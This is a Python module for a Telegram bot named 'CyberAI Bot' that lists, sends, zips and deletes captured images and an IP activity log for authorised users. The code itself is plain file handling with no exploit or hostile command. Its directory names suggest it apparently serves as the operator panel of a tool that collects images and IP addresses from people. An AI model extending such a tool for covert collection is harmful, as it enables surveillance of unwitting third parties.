"""
CyberAI Bot — Logs & Captures Handler
View, download, and manage captured images and activity logs.
"""

import logging
from pathlib import Path
from telegram import Update
from telegram.error import BadRequest
from telegram.ext import ContextTypes, CallbackQueryHandler

from bot.middleware.auth import authorized_only
from bot.utils.keyboards import (
    captures_action_keyboard, logs_action_keyboard,
    confirm_clear_keyboard, main_menu_keyboard
)
from bot.utils.messages import (
    captures_summary, logs_summary, no_captures, no_logs,
    cleared_successfully, error_message
)
from bot.utils.helpers import (
    count_files, get_latest_files, zip_directory,
    read_log_file, count_log_lines, format_file_size,
    clear_directory, clear_log_file
)
from bot.config import CAPTURED_DIR, IP_LOGS_DIR, DATA_DIR
from bot.database.session import log_activity

logger = logging.getLogger(__name__)

ACTIVITY_LOG = IP_LOGS_DIR / "activity.log"


async def _safe_edit(query, text, parse_mode="HTML", reply_markup=None):
    """Edit message text, silently ignoring 'message is not modified' errors."""
    try:
        await query.edit_message_text(
            text=text,
            parse_mode=parse_mode,
            reply_markup=reply_markup,
        )
    except BadRequest as e:
        if "message is not modified" not in str(e).lower():
            raise


# ── Captures Menu ─────────────────────────────────────────────

@authorized_only
async def captures_menu_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Show captures overview."""
    query = update.callback_query
    await query.answer()

    total = count_files(CAPTURED_DIR)

    if total == 0:
        await _safe_edit(
            query,
            no_captures(),
            reply_markup=main_menu_keyboard(),
        )
        return

    latest = get_latest_files(CAPTURED_DIR, limit=1)
    latest_name = latest[0].name if latest else None

    await _safe_edit(
        query,
        captures_summary(total, latest_name),
        reply_markup=captures_action_keyboard(),
    )


@authorized_only
async def captures_latest_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Send latest 5 or 20 captures."""
    query = update.callback_query
    await query.answer("Sending captures...")

    limit = 20 if query.data == "captures_latest_20" else 5
    captures = get_latest_files(CAPTURED_DIR, limit=limit)
    chat_id = update.effective_chat.id

    if not captures:
        await _safe_edit(
            query,
            no_captures(),
            reply_markup=main_menu_keyboard(),
        )
        return

    sent = 0
    for filepath in captures:
        try:
            with open(filepath, 'rb') as photo:
                await context.bot.send_photo(
                    chat_id=chat_id,
                    photo=photo,
                    caption=f"Capture: {filepath.name}",
                )
                sent += 1
        except Exception as e:
            logger.error(f"Failed to send {filepath}: {e}")

    await context.bot.send_message(
        chat_id=chat_id,
        text=f"Sent {sent} capture(s)",
        reply_markup=captures_action_keyboard(),
    )


@authorized_only
async def captures_zip_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Send all captures as a ZIP file."""
    query = update.callback_query
    await query.answer("Creating ZIP archive...")

    total = count_files(CAPTURED_DIR)
    if total == 0:
        await _safe_edit(
            query,
            no_captures(),
            reply_markup=main_menu_keyboard(),
        )
        return

    zip_path = DATA_DIR / "captures.zip"

    try:
        result = zip_directory(CAPTURED_DIR, zip_path)

        if result and result.exists():
            size = format_file_size(result.stat().st_size)

            with open(result, 'rb') as zf:
                await context.bot.send_document(
                    chat_id=update.effective_chat.id,
                    document=zf,
                    filename="captures.zip",
                    caption=f"All captures ({total} files, {size})",
                )

            # Clean up zip
            result.unlink(missing_ok=True)

            log_activity(update.effective_user.id, "captures_download", f"{total} files")
        else:
            await _safe_edit(
                query,
                no_captures(),
                reply_markup=main_menu_keyboard(),
            )

    except Exception as e:
        logger.error(f"ZIP creation error: {e}")
        await context.bot.send_message(
            chat_id=update.effective_chat.id,
            text=f"Error creating ZIP: {e}",
            reply_markup=captures_action_keyboard(),
        )


@authorized_only
async def captures_clear_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Ask confirmation before clearing captures."""
    query = update.callback_query
    await query.answer()

    total = count_files(CAPTURED_DIR)

    await _safe_edit(
        query,
        f"Delete all {total} captured images?\n\nThis action cannot be undone!",
        reply_markup=confirm_clear_keyboard("captures"),
    )


@authorized_only
async def clear_captures_confirm(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle captures clear confirmation."""
    query = update.callback_query
    await query.answer()

    if query.data == "clear_captures_yes":
        count = clear_directory(CAPTURED_DIR)
        log_activity(update.effective_user.id, "captures_clear", f"{count} files deleted")

        await _safe_edit(
            query,
            cleared_successfully(f"{count} captured images"),
            reply_markup=main_menu_keyboard(),
        )
    else:
        await _safe_edit(
            query,
            "Captures preserved.",
            reply_markup=captures_action_keyboard(),
        )


# ── Logs Menu ─────────────────────────────────────────────────

@authorized_only
async def logs_menu_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Show logs overview."""
    query = update.callback_query
    await query.answer()

    lines = count_log_lines(ACTIVITY_LOG)

    if lines == 0:
        await _safe_edit(
            query,
            no_logs(),
            reply_markup=main_menu_keyboard(),
        )
        return

    size = format_file_size(ACTIVITY_LOG.stat().st_size) if ACTIVITY_LOG.exists() else "0 B"

    await _safe_edit(
        query,
        logs_summary(lines, size),
        reply_markup=logs_action_keyboard(),
    )


@authorized_only
async def logs_view_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """View last 50 lines of the activity log."""
    query = update.callback_query
    await query.answer()

    content = read_log_file(ACTIVITY_LOG, tail_lines=50)

    if not content:
        await _safe_edit(
            query,
            no_logs(),
            reply_markup=main_menu_keyboard(),
        )
        return

    from bot.utils.helpers import truncate_message

    text = (
        "Activity Log (last 50 entries)\n\n"
        f"<pre>{content}</pre>"
    )
    text = truncate_message(text)

    await _safe_edit(
        query,
        text,
        reply_markup=logs_action_keyboard(),
    )


@authorized_only
async def logs_download_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Download the activity log file."""
    query = update.callback_query
    await query.answer("Sending log file...")

    if not ACTIVITY_LOG.exists() or ACTIVITY_LOG.stat().st_size == 0:
        await _safe_edit(
            query,
            no_logs(),
            reply_markup=main_menu_keyboard(),
        )
        return

    try:
        with open(ACTIVITY_LOG, 'rb') as f:
            await context.bot.send_document(
                chat_id=update.effective_chat.id,
                document=f,
                filename="activity.log",
                caption="Complete activity log",
            )
        log_activity(update.effective_user.id, "logs_download", "")
    except Exception as e:
        logger.error(f"Log download error: {e}")
        await context.bot.send_message(
            chat_id=update.effective_chat.id,
            text=f"Error downloading log: {e}",
        )


@authorized_only
async def logs_clear_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Ask confirmation before clearing logs."""
    query = update.callback_query
    await query.answer()

    await _safe_edit(
        query,
        "Clear all activity logs?\n\nThis action cannot be undone!",
        reply_markup=confirm_clear_keyboard("logs"),
    )


@authorized_only
async def clear_logs_confirm(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle logs clear confirmation."""
    query = update.callback_query
    await query.answer()

    if query.data == "clear_logs_yes":
        clear_log_file(ACTIVITY_LOG)
        log_activity(update.effective_user.id, "logs_clear", "")

        await _safe_edit(
            query,
            cleared_successfully("Activity logs"),
            reply_markup=main_menu_keyboard(),
        )
    else:
        await _safe_edit(
            query,
            "Logs preserved.",
            reply_markup=logs_action_keyboard(),
        )


def get_handlers():
    """Return all handlers for this module."""
    return [
        # Captures
        CallbackQueryHandler(captures_menu_callback, pattern="^menu_captures$"),
        CallbackQueryHandler(captures_latest_callback, pattern="^captures_latest"),
        CallbackQueryHandler(captures_zip_callback, pattern="^captures_zip$"),
        CallbackQueryHandler(captures_clear_callback, pattern="^captures_clear$"),
        CallbackQueryHandler(clear_captures_confirm, pattern="^clear_captures_"),

        # Logs
        CallbackQueryHandler(logs_menu_callback, pattern="^menu_logs$"),
        CallbackQueryHandler(logs_view_callback, pattern="^logs_view$"),
        CallbackQueryHandler(logs_download_callback, pattern="^logs_download$"),
        CallbackQueryHandler(logs_clear_callback, pattern="^logs_clear$"),
        CallbackQueryHandler(clear_logs_confirm, pattern="^clear_logs_"),
    ]
